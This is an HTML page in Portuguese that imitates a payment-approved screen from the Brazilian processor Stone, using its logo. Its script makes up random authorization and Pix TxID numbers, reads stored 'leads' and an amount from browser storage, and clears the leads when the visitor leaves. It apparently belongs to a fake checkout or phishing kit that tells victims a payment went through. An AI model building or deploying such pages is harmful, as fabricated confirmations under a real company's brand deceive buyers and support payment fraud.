<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Stone – Pagamento Aprovado</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
:root{
  --bg:#eef2f7;
  --card:#ffffff;
  --pri:#00d4aa;
  --pri-dark:#00b796;
  --text:#1e293b;
  --muted:#64748b;
  --line:#e2e8f0;
  --radius:12px;
  --shadow:0 8px 25px rgba(0,0,0,.04);
}
*{margin:0;padding:0;box-sizing:border-box;font-family:"Inter",system-ui}
body{display:flex;align-items:center;justify-content:center;min-height:100vh;background:var(--bg);padding:20px}
.wrap{background:var(--card);width:100%;max-width:420px;border-radius:var(--radius);box-shadow:var(--shadow);padding:32px 24px;text-align:center}
.logo{width:120px;margin-bottom:24px}
.check-wrap{display:flex;align-items:center;justify-content:center;margin:0 auto 20px}
.check{stroke-width:3;stroke:var(--pri);fill:none;stroke-linecap:round;stroke-linejoin:round}
.check-circle{stroke-dasharray:166;stroke-dashoffset:166;animation:drawCircle .6s forwards}
.check-mark{stroke-dasharray:48;stroke-dashoffset:48;animation:drawCheck .3s .5s forwards}
@keyframes drawCircle{to{stroke-dashoffset:0}}
@keyframes drawCheck{to{stroke-dashoffset:0}}
.badge{display:inline-flex;align-items:center;gap:6px;background:#f0fdf4;color:#16a34a;padding:6px 12px;border-radius:999px;font-size:12px;font-weight:600;margin-bottom:20px}
.detalhes{background:#f8fafc;border:1px solid var(--line);border-radius:var(--radius);padding:14px;margin-bottom:20px;text-align:left;font-size:13px}
.detalhes div{display:flex;justify-content:space-between;margin-bottom:6px}
.btn{background:var(--pri);color:#fff;font-weight:600;padding:12px;border:none;border-radius:var(--radius);cursor:pointer;transition:.2s;width:100%}
.btn:hover{background:var(--pri-dark)}
</style>
</head>
<body>
<div class="wrap">
  <img class="logo" src="https://logodownload.org/wp-content/uploads/2022/10/stone-logo-0.png" alt="Stone">

  <div class="check-wrap">
    <svg class="check" width="72" height="72" viewBox="0 0 52 52">
      <circle class="check-circle" cx="26" cy="26" r="25"/>
      <path class="check-mark" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
    </svg>
  </div>

  <div class="badge">✓ Pago</div>
  <h2 id="titulo">Pagamento aprovado!</h2>
  <p id="subtitulo">Seu comprovante foi enviado para o e-mail cadastrado.</p>

  <div class="detalhes" id="detalhes"></div>

  <button class="btn" onclick="voltar()">Voltar ao site</button>
</div>

<script>
const params=new URLSearchParams(location.search);
const metodo=params.get('metodo');
const leads=JSON.parse(localStorage.leads||'[]');
const last=leads[leads.length-1]||{};
function randAuth(){return Math.floor(1e8+Math.random()*9e8).toString();}
function formataDataHora(){return new Date().toLocaleString('pt-BR',{day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit'});}
function voltar(){localStorage.removeItem('leads');location.href='index.html';}
const cfg={valor:+localStorage.valor||997};
if(metodo==='pix'){
  document.getElementById('titulo').textContent='Pix confirmado!';
  document.getElementById('subtitulo').textContent='O dinheiro já está na conta do estabelecimento.';
  document.getElementById('detalhes').innerHTML=`
    <div><span>Valor</span><span>R$ ${cfg.valor.toFixed(2).replace('.',',')}</span></div>
    <div><span>Horário</span><span>${formataDataHora()}</span></div>
    <div><span>TxID</span><span>${randAuth()}</span></div>
    <div><span>Status</span><span>Pago</span></div>`;
}else{
  document.getElementById('titulo').textContent='Cartão aprovado!';
  document.getElementById('subtitulo').textContent='Sua fatura será enviada para o e-mail cadastrado.';
  document.getElementById('detalhes').innerHTML=`
    <div><span>Valor</span><span>R$ ${cfg.valor.toFixed(2).replace('.',',')}</span></div>
    <div><span>Parcelas</span><span>${last.parcelas||1}x</span></div>
    <div><span>Autorização</span><span>${randAuth()}</span></div>
    <div><span>Status</span><span>Aprovada</span></div>`;
}
</script>
</body>
</html>